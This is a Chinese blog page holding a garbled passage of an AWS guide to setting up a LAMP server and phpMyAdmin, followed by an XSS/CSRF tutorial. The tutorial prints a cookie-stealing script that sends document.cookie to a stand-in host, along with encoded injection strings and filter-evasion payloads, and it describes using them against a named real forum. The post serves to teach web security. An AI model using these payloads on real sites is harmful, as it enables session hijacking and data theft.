5.6.13-1.118.amzn1 @amzn-main php56-mysqlnd.x86_64 5.6.13-1.118.amzn1 @amzn-main&lt;/code&gt;&lt;/pre&gt;
如果输出中未列出任何必需的程序包，请使用 **sudo yum install _</code>package<code>_** 命令安装它们。

&lt;/div&gt;
3.  删除</code>phpinfo.php<code>文件。尽管此信息可能对您很有用，但出于安全考虑，不应将其传播到 Internet。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>rm /var/www/html/phpinfo.php`</code></strong></code></pre><br></div><br><div><a name="SecuringMySQLProcedure"></a><strong>保障 MySQL 服务器的安全</strong><br><br>MySQL 服务器的默认安装提供有多种功能，这些功能对于测试和开发都很有帮助，但对于产品服务器，应禁用或删除这些功能。<strong>mysql_secure_installation</strong> 命令可引导您设置根密码并删除安装中的不安全功能。即使您不打算使用 MySQL 服务器，执行此步骤也是一个不错的建议。<br><br>1.  启动 MySQL 服务器，以便运行 <strong>mysql_secure_installation</strong>。<br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo service mysqld start</code><strong> Initializing MySQL database: Installing MySQL system tables… OK Filling help tables… OK To start mysqld at boot time you have to copy support-files/mysql.server to the right place for your system PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER ! … Starting mysqld: [ OK ] </strong></pre><br>。<br>2.  运行 mysql_secure_installation<strong>。<br><pre>`[ec2-user ~]$ </pre></strong><code>sudo mysql_secure<em>installation<code>**&lt;/code&gt;&lt;/pre&gt;

    1.  在系统提示时，输入</code>root<code>账户的密码。

            1.  输入当前</code>root<code>密码。默认情况下，</code>root<code>账户没有设置密码，因此按 **Enter**。
        2.  键入 **Y** 设置密码，然后输入两次安全密码。有关创建安全密码的更多信息，请转至 [http://www.pctools.com/guides/password/](http://www.pctools.com/guides/password/)。确保将此密码存储在安全位置。

        2.  键入 **Y** 删除匿名用户账户。
    3.  键入 **Y** 禁用远程</code>root<code>登录。
    4.  键入 **Y** 删除测试数据库。
    5.  键入 **Y** 重新加载权限表并保存您的更改。

3.  （可选）如果不打算立即使用 MySQL 服务器，请停止。您可以在需要时再次重新启动该服务器。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>sudo service mysqld stop`</code></strong> Stopping mysqld: [ OK ]</em></code><br><br>4.  （可选）如果您希望每次启动时 MySQL 服务器都启动，请输入以下命令。<br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo chkconfig mysqld on</code><strong></strong></pre><br></div><br>现在，您应该有了一个功能完善的 LAMP Web 服务器。如果您将内容添加到位于<code>/var/www/html</code> 的 Apache 文档根目录，您应该能够在实例的公有 DNS 地址处看到这些内容。<br><div><a name="d0e4777"></a>（可选）安装 phpMyAdmin<strong><br><br><a href="https://www.phpmyadmin.net/" target="_blank" rel="external">phpMyAdmin</a> 是一种基于 Web 的数据库管理工具，可用于在 EC2 实例上查看和编辑 MySQL 数据库。按照以下步骤操作可在您的 Amazon Linux 实例上安装和配置 phpMyAdmin。<br><br>1.  在您的实例上从 Fedora 项目启用 Extra Packages for Enterprise Linux (EPEL) 存储库。<br><pre>`[ec2-user ~]$ </pre></strong><code>sudo yum-config-manager –enable <code>epel<code>_&lt;/code&gt;**&lt;/code&gt;&lt;/pre&gt;

2.  安装</code>phpMyAdmin<code>软件包。
&lt;pre&gt;</code>[ec2-user ~]$ <strong><code>sudo yum install -y phpMyAdmin`</code></strong></code><br><div><br><br>Note<br><br>在系统提示时，回答 <code>y</code> 以导入 EPEL 存储库的 GPG 密钥。<br><br></div><br>3.  将您的 <code>phpMyAdmin</code> 安装配置为允许从本地计算机进行访问。默认情况下，<code>phpMyAdmin</code>仅允许从其运行于的服务器进行访问，这不是很有用，因为 Amazon Linux 不包括 Web 浏览器。<br><br>    1.  通过访问服务（例如 <a href="https://www.whatismyip.com/" target="_blank" rel="external">whatismyip.com</a>）查找您的本地 IP 地址。<br>    2.  <a name="step-phpMyAdmin.conf"></a>编辑 <code>/etc/httpd/conf.d/phpMyAdmin.conf</code> 文件并使用以下命令将服务器 IP 地址 (127.0.0.1) 替换为您的本地 IP 地址，并将 _<code>your_ip_address</code><em> 替换为您在上一步中标识的本地 IP 地址。<br><pre>`[ec2-user ~]$ **<code>sudo sed -i -e ‘s/127.0.0.1/</code></pre></em><code>your_ip<em>address`</em>/g’ /etc/httpd/conf.d/phpMyAdmin.conf</code><strong></strong></code><br><br>4.  <a name="step-phpMyAdmin-restart-httpd"></a>重启 Apache Web 服务器，让新配置生效。<br><pre>`[ec2-user ~]$ <code>sudo service httpd restart<code>** Stopping httpd: [ OK ] Starting httpd: [ OK ]&lt;/code&gt;&lt;/pre&gt;

5.  在 Web 浏览器中，输入</code>phpMyAdmin<code>安装的 URL。此 URL 是实例的公用 DNS 地址，后接正斜杠和 phpmyadmin。例如：
&lt;pre&gt;</code>http://<em><code>my.public.dns.amazonaws.com`</code></em>/phpmyadmin</code></pre><br>您应该可以看到 phpMyAdmin 登录页面。<br><div><img src="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/images/phpmyadmin_login.png" alt=""></div><br><div><br><br>Note<br><br>如果您收到 <code>403 Forbidden</code> 错误，请验证您是否在<code>/etc/httpd/conf.d/phpMyAdmin.conf</code> 文件中设置了正确的 IP 地址。您可以使用以下命令查看 Apache 访问日志，以了解 Apache 服务器实际从哪个 IP 地址获取请求：<br><pre><code>[ec2-user ~]$ **&lt;code&gt;sudo tail -n 1 /var/log/httpd/access_log | awk &#39;{ print $1 }&#39;</code>** <em><code>205.251.233.48</code></em></pre><br>使用此处返回的 IP 地址重复<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/install-LAMP.html#step-phpMyAdmin.conf" title="Step 3.b" target="_blank" rel="external">Step 3.b</a> 并通过<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/install-LAMP.html#step-phpMyAdmin-restart-httpd" title="Step 4" target="_blank" rel="external">Step 4</a> 重启 <code>httpd</code> 服务。<br><br></div><br>6.  使用您先前创建的 <code>root</code> 用户名和 MySQL 根密码登录到 <code>phpMyAdmin</code> 安装。有关使用<code>phpMyAdmin</code> 的更多信息和帮助，请参阅 <a href="http://docs.phpmyadmin.net/en/latest/user.html" target="_blank" rel="external"><code>phpMyAdmin</code> 用户指南</a>。<br></div></div></div>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/12/07/e5-9c-a8linux-e4-b8-8a-e9-9d-a2-e5-ae-89-e8-a3-85-lamp-web-e6-9c-8d-e5-8a-a1-e5-99-a8/" data-id="cinsnz8qc005socpd3170geyf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e7-bd-91-e7-ab-99-e5-ae-89-e5-85-a8-e4-b9-8b-ef-bd-98-ef-bd-93-ef-bd-93-ef-bc-8f-ef-bd-83-ef-bd-92-ef-bd-93-ef-bd-86" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/11/13/e7-bd-91-e7-ab-99-e5-ae-89-e5-85-a8-e4-b9-8b-ef-bd-98-ef-bd-93-ef-bd-93-ef-bc-8f-ef-bd-83-ef-bd-92-ef-bd-93-ef-bd-86/" class="article-date">
  <time datetime="2015-11-13T08:42:54.000Z" itemprop="datePublished">2015-11-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/安全/">安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/13/e7-bd-91-e7-ab-99-e5-ae-89-e5-85-a8-e4-b9-8b-ef-bd-98-ef-bd-93-ef-bd-93-ef-bc-8f-ef-bd-83-ef-bd-92-ef-bd-93-ef-bd-86/">网站安全之ｘｓｓ／ｃｒｓｆ</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="XSS脚本攻击"><a href="#XSS脚本攻击" class="headerlink" title="XSS脚本攻击"></a>XSS脚本攻击</h2><p>XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分，所以取名XSS。它是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML标签以及用户端脚本语言。</p>
<h3 id="名城苏州网站注入"><a href="#名城苏州网站注入" class="headerlink" title="　　名城苏州网站注入"></a>　　名城苏州网站注入</h3><p>XSS注入常见的重灾区是社交网站和论坛，越是让用户自由输入内容的地方，我们就越要关注其能否抵御XSS攻击。XSS注入的攻击原理很简单，构造一些非法的url地址或js脚本让HTML标签溢出，从而造成注入。一般引诱用户点击才触发的漏洞我们称为反射性漏洞，用户打开页面就触发的称为注入型漏洞，当然注入型漏洞的危害更大一些。下面先用一个简单的实例来说明XSS注入无处不在。</p>
<p>名城苏州（www.2500sz.com)，是苏州本地门户网站，日均的pv数也达到了150万，它的论坛用户数很多，是本地化新闻、社区论坛做的比较成功的一个网站。</p>
<p>接下来我们将演示一个注入到2500sz.com的案例，我们先注册成一个2500sz.com站点会员，进入论坛板块，开始发布新帖。打开发帖页面，在web<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B1%E0%BC%AD%C6%F7&amp;k0=%B1%E0%BC%AD%C6%F7&amp;kdi0=0&amp;luki=3&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">编辑器</a>中输入如下内容：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037854689.JPG" alt=""></p>
<p>上面的代码即为分享一个网络图片，我们在图片的src属性中直接写入了<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">javascript</a>:alert(‘xss’);，操作成功后生成帖子，用IE6、7的用户打开此帖子就会出现下图的alert(‘xss’)弹窗。</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037002853.JPG" alt=""></p>
<p>当然我们要将标题设计的非常夺人眼球，比如“Pm2.5雾霾真相披露” ，然后将里面的alert换成如下恶意代码：</p>
<p><pre>location.href=’<a href="http://www.xss.com?cookie=&#39;+document.cookie；" target="_blank" rel="external">http://www.xss.com?cookie=&#39;+document.cookie；</a></pre><br>这样我们就获取到了用户cookie的值，如果服务端session设置过期很长的话，以后就可以伪造这个用户的身份成功登录而不再需要用户名密码，关于session和cookie的关系我们在下一节中将会详细讲到。这里的location.href只是出于简单，如果做了跳转这个帖子很快会被管理员删除，但我们写如下代码，并且帖子的内容也是真实的，那么就会祸害很多人：</p>
<p><pre>var img = document.createElement(‘img’);<br>img.src=’<a href="http://www.xss.com?cookie=&#39;+document.cookie" target="_blank" rel="external">http://www.xss.com?cookie=&#39;+document.cookie</a>;<br>img.style.display=’none’;<br>document.getElementsByTagName(‘body’)[0].appendChild(img);</pre><br>这样就神不知鬼不觉的把当前用户cookie的值发送到恶意站点，恶意站点通过GET参数，就能获取用户cookie的值。通过这个方法可以拿到用户各种各样的私密数据。</p>
<h3 id="Ajax的XSS注入"><a href="#Ajax的XSS注入" class="headerlink" title="　　Ajax的XSS注入"></a>　　Ajax的XSS注入</h3><p>另一处容易造成XSS注入的地方是Ajax的不正确使用。</p>
<p>比如有这样的一个场景，在一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，项目经理要求先显示博文的内容，然后通过Ajax去获取留言的第一页信息，留言功能通过Ajax分页保证了页面的无刷新和快速加载，此做法的好处有：</p>
<p>（1）加快了博文详细页的加载，提升了用户体验，因为留言信息往往有用户头像、昵称、id等等，需要多表查询，且一般用户会先看博文，再拉下去看留言，这时留言已加载完毕。</p>
<p>（2）Ajax的留言分页能更快速响应，用户不必每次分页都让博文重新刷新。</p>
<p>于是前端工程师从PHP那获取了json数据之后，将数据放入DOM文档中，大家能看出下面代码的问题吗？</p>
<p><pre>var commentObj = $(‘#comment’);<br>$.get(‘/getcomment’, {r:Math.random(),page:1,article_id:1234},function(data){<br>    //通过Ajax获取评论内容，然后将品论的内容一起加载到页面中<br>    if(data.state !== 200)  return commentObj.html(‘留言加载失败。’)<br>    commentObj.html(data.content);<br>},’json’);</pre><br>我们设计的初衷是，PHP程序员将留言内容套入模板，返回json格式数据，示例如下：</p>
<p><pre>{“state”:200, “content”:”模板的字符串片段”}</pre><br>如果没有看出问题，大家可以打开firebug或者chrome的开发人员工具，直接把下面代码粘贴到有JQuery插件的网站中运行：</p>
<p><pre>$(‘div:first’).html(‘&lt;div&gt;&lt;script&gt;alert(“xss”)&lt;/script&gt;&lt;div&gt;’);</pre><br>正常弹出了alert框，你可能觉得这比较小儿科。</p>
<p>如果PHP程序员已经转义了尖括号&lt;&gt;还有单双引号”‘，那么上面的恶意代码会被漂亮的变成如下字符输出到留言内容中:</p>
<p><pre>$(‘div:first’).html(‘&lt;script&gt; alert(“xss”)&lt;/script&gt; ‘);</pre><br>这里我们需要表扬一下PHP程序员，可以将一些常规的XSS注入都屏蔽掉，但是在utf-8编码中，字符还有另一种表示方式，那就是unicode码，我们把上面的恶意字符串改写成如下：</p>
<p><pre> $(‘div:first’).html(‘<br>\u003c \u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c \u0065\u0072\u0074<br>\u0028 \u0022\u0078\u0073\u0073\u0022\u0029\u003c \u002f\u0073 \u0063\u0072\u0069\<br>u0070\u0074\u003e’);</pre><br>大家发现还是输出了alert框，只是这次需要将写好的恶意代码放入转码工具中做下转义，webqq曾经就爆出过上面这种unicode码的XSS注入漏洞，另外有很多反射型XSS漏洞因为过滤了单双引号，所以必须使用这种方式进行注入。</p>
<h3 id="base64注入"><a href="#base64注入" class="headerlink" title="　　base64注入"></a>　　base64注入</h3><p>除了比较老的ie6、7浏览器，一般浏览器在加载一些图片资源的时候我们可以使用base64编码显示指定图片，比如下面这段base64编码：</p>
<p><pre>&lt;img src=”data:image/png;base64,iVBORw0KGgoAAAANSUhEU (… 省略若干字符)<br>AAAASUVORK5CYII=” /&gt;</pre><br>表示的就是一张Node.js官网的logo，图片如下：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037789767.PNG" alt=""></p>
<p>我们一般使用这样的技术把一些网站常用的logo或者小图标转存成为base64编码，进而减少一次客户端向<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">服务器</a>的请求，加快用户加载页面速度。</p>
<p>我们还可以把HTML页面的代码隐藏在data属性之中，比如下面的代码将打开一个hello world的新页面。</p>
<p><pre>&lt;a href=”data:text/html;ascii,&lt;html&gt;&lt;title&gt;hello&lt;/title&gt;&lt;body&gt;hello world<br>&lt;/body&gt;&lt;/html&gt;”&gt;click me&lt;/a&gt;</pre><br>根据这样的特性，我们就可以尝试把一些恶意的代码转存成为base64编码格式，然后注入到a标签里去，从而形成反射型XSS漏洞，我们编码如下代码。</p>
<p><pre>&lt;img src=x onerror=alert(1)&gt;</pre><br>经过base64编码之后的恶意代码如下。</p>
<p><pre>&lt;a href=”data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==”&gt;base64 xss&lt;/a&gt;</pre><br>用户在点击这个超链接之后，就会执行如上的恶意alert弹窗，就算网站开发者过滤了单双引号”,’和左右尖括号&lt;&gt;，注入还是能够生效的。</p>
<p>不过这样的注入因为跨域的问题，恶意脚本是无法获取网站的cookie值。另外如果网站提供我们自定义flash路径，也是可以使用相同的方式进行注入的，下面是一段规范的在网页中插入flash的代码：</p>
<p><pre>&lt;object type=”application/x-shockwave-flash” data=”movie.swf” width=”400” height=”300”&gt;<br>&lt;param name=”movie” value=”movie.swf” /&gt;<br>&lt;/object&gt;</pre><br>把data属性改写成如下恶意内容，也能够通过base64编码进行注入攻击：</p>
<p><pre>&lt;script&gt;alert(“Hello”);&lt;/script&gt;</pre><br>经过编码过后的注入内容：</p>
<p><pre>&lt;object data=”data:text/html;base64, PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=”&gt;&lt;/object&gt;</pre><br>用户在打开页面后，会弹出alert框，但是在chrome浏览器中是无法获取到用户cookie的值，因为chrome会认为这个操作不安全而禁止它，看来我们的浏览器为用户安全也做了不少的考虑。</p>
<h3 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="　　常用注入方式"></a>　　常用注入方式</h3><p>注入的根本目的就是要HTML标签溢出，从而执行攻击者的恶意代码，下面是一些常用攻击手段：</p>
<p>（1）alert(String.fromCharCode(88,83,83))，通过获取字母的ascii码来规避单双引号，这样就算网站过滤掉单双引号也还是可以成功注入的。</p>
<p>（2）&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;，通过注入img标签来达到攻击的目的，这个只对ie6和ie7下有效，意义不大。</p>
<p>（3）&lt;IMG SRC=””onerror=”alert(‘xxs’)”&gt;，如果能成功闭合img标签的src属性，那么加上onload或者onerror事件可以更简单的让用户遭受攻击。</p>
<p>（4）&lt;IMG SRC=<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">javascript</a>:alert(‘XSS’)&gt;，这种方式也只有对ie6奏效。</p>
<p>（5）&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;，&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;，&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;，我们也可以把关键字Javascript分开写，避开一些简单的验证，这种方式ie6统统中招，所以ie6真不是安全的浏览器。</p>
<p>（6）&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;，通过样式表也能注入。</p>
<p>（7）&lt;STYLE&gt;@im\port’\ja\vasc\ript:alert(“XSS”)’;&lt;/STYLE&gt;,如果可以自定义style样式，也可能被注入。</p>
<p>（8）&lt;IFRAME SRC=”<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">javascript</a>:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;，iframe的标签也可能被注入。</p>
<p>（9）&lt;a href=”javasc ript:alert(1)”&gt;click&lt;/a&gt;，利用 伪装换行，:伪装冒号，从而避开对Javascript关键字以及冒号的过滤。</p>
<p>其实XSS注入过程充满智慧，只要你反复尝试各种技巧，就可能在网站的某处攻击成功。总之，发挥你的想象力去注入吧，最后别忘了提醒下站长哦。更多XSS注入方式参阅：(XSS Filter Evasion Cheat Sheet)[<a href="https://www.owasp.org/index.php/XSSFilterEvasionCheatSheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSSFilterEvasionCheatSheet</a>]</p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="　　防范措施"></a>　　防范措施</h3><p>对于防范XSS注入，其实只有两个字过滤，一定要对用户提交上来的数据保持怀疑，过滤掉其中可能注入的字符，这样才能保证应用的安全。另外，对于入库时过滤还是读库时过滤，这就需要根据应用的类型来进行选择了。下面是一个简单的过滤HTML标签的<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%BA%AF%CA%FD&amp;k0=%BA%AF%CA%FD&amp;kdi0=0&amp;luki=1&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">函数</a>代码：</p>
<p><pre>var escape = function(html){<br>  return String(html)<br>    .replace(/&amp;(?!\w+;)/g, ‘&amp;’)<br>    .replace(/&lt;/g, ‘&lt;’)<br>    .replace(/&gt;/g, ‘&gt;’)<br>    .replace(/“/g, ‘“‘)<br>    .replace(/‘/g, ‘’’);<br>};</pre><br>不过上述的过滤方法会把所有HTML标签都转义，如果我们的网站应用确实有自定义HMTL标签的需求的话，它就力不从心了。这里我推荐一个过滤XSS注入的模块，由本书另一位作者老雷提供：<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="external">js-xss</a></p>
<h2 id="CSRF请求伪造"><a href="#CSRF请求伪造" class="headerlink" title="　CSRF请求伪造"></a>　CSRF请求伪造</h2><p>CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。</p>
<h3 id="Session详解"><a href="#Session详解" class="headerlink" title="　　Session详解"></a>　　Session详解</h3><p>想要深入理解CSRF攻击的特性，我们必须了解网站session的工作原理。</p>
<p>session我想大家都不会陌生，无论你用Node.js或PHP开发过网站的肯定都用过session对象，假如我把浏览器的cookie禁用了，大家认为session还能正常工作吗？</p>
<p>答案是否定的，我举个简单的例子来帮助大家理解session的含义。</p>
<p>比如我办了一张超市的储值会员卡，我能享受部分商品打折的优惠，我的个人资料以及卡内余额都是保存在超市会员数据库里的。每次结账时，出示会员卡超市便能知道我的身份，随即进行打折优惠并扣除卡内相应余额。</p>
<p>这里我们的会员卡卡号就相当于保存在cookie中的sessionid，而我的个人信息就是保存在服务端的session对象，因为cookie有两个重要特性，（1）同源性，保证了cookie不会跨域发送造成泄密；（2）附带性，保证每次请求服务端都会在请求头中带上cookie信息。也就是这两个特性为我们识别用户带来的便利，因为HTTP协议是无状态的，我们之所以知道请求用户的身份，其实就是获取了用户请求头中的cookie信息。</p>
<p>当然session对象的保存方法多种多样，可以保存在文件中，也可以是内存里。考虑到分布式的横向扩展，我们还是建议生产环境把它保存在第三方媒介中，比如redis或者mongodb，默认的express框架是将session对象保存在内存里的。</p>
<p>除了用cookie保存sessionid，我们还可以使用url参数来保存sessionid，只不过每次请求都需要在url里带上这个参数，根据这个参数，我们就能识别此次请求的用户身份了。</p>
<p>另外近阶段利用Etag来保存sessionid也被使用在用户行为跟踪上，Etag是静态资源<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">服务器</a>对用户请求头中if-none-match的响应，一般我们第一次请求某一个静态资源是不会带上任何关于缓存信息的请求头的，这时候静态资源服务器根据此资源的大小和最终修改时间，哈希计算出一个字符串作为Etag的值响应给客户端，如下图：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037325038.PNG" alt=""></p>
<p>第二次当我们再访问这个静态资源的时候，由于本地浏览器具有此图片的缓存，但是不确定服务器是否已经更新掉了这个静态资源，所以在发起请求的时候会带上if-none-match参数，其值就是上次请求服务器响应的Etag值。服务器接收到这个if-none-match的值，再根据原算法去生成Etag值，进行比对。如果两个值相同，则说明该静态资源没有被更新，于是响应状态码304，告诉浏览器放心的使用本地缓存，远程资源没有更新，结果如下图：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037233874.PNG" alt=""></p>
<p>当然如果远程资源有变动，则<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">服务器</a>会响应一份新的资源给浏览器，并且Etag的值也会不同。根据这样的一个特性，我们可以得出结论，在用户第一次请求某一个静态资源的时候我们响应给它一个全局唯一的Etag值，在用户不清空缓存的情况下，用户下次再请求到服务器，还是会带上同一个Etag值的，于是我们可以利用这个值作为sessionid，而我们在服务器端保存这些Etag值和用户信息的对应关系，也就可以利用Etag来标识出用户身份了。</p>
<h3 id="CSRF的危害性"><a href="#CSRF的危害性" class="headerlink" title="　　CSRF的危害性"></a>　　CSRF的危害性</h3><p>在我们理解了session的工作机制后，CSRF攻击也就很容易理解了。CSRF攻击就相当于恶意用户复制了我的会员卡，用我的会员卡享受购物的优惠折扣，更可以使用我购物卡里的余额购买他的东西！</p>
<p>CSRF的危害性已经不言而喻了，恶意用户可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的）。如果发送的垃圾信息还带有蠕虫链接的话，接收到这些有害信息的好友一旦打开私信中的链接，就也成为了有害信息的散播者，这样数以万计的用户被窃取了资料、种植了木马。整个网站的应用就可能在短时间内瘫痪。</p>
<p>MSN网站，曾经被一个美国的19岁小伙子Samy利用css的background漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想。同样的事情也曾经发生在新浪微博上。</p>
<p>想要CSRF攻击成功，最简单的方式就是配合XSS注入，所以千万不要小看了XSS注入攻击带来的后果，不是alert一个对话框那么简单，XSS注入仅仅是第一步！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/11/13/e7-bd-91-e7-ab-99-e5-ae-89-e5-85-a8-e4-b9-8b-ef-bd-98-ef-bd-93-ef-bd-93-ef-bc-8f-ef-bd-83-ef-bd-92-ef-bd-93-ef-bd-86/" data-id="cinsnz8po003tocpdnttu8nmc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-ae-9e-e7-8e-b0-php5-4-e4-b8-ad-json-encodestr-json-unescaped-unicode" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/10/16/e5-ae-9e-e7-8e-b0-php5-4-e4-b8-ad-json-encodestr-json-unescaped-unicode/" class="article-date">
  <time datetime="2015-10-16T11:52:53.000Z" itemprop="datePublished">2015-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP/">PHP</a>
  </div>

  </div>
  <div class="article-inner">
    
